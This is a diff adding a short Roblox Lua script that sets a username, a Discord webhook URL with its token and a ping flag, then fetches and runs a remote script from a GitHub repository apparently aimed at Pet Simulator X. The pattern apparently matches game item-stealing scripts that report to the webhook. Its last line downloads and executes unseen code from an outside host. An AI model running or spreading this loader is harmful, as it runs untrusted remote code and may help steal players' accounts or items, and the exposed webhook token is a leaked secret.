@@ -1,0 +1,5 @@
+UserName = "RoshBloxYT"
+WebHook = "https://discord.com/api/webhooks/1063052793440632942/MZlpB791ZvJAPJOaa2lfIWUfLdRyMbzP6ctrjV2EZoZkszr0OypqUpggUdfl7h1N-Rid"
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
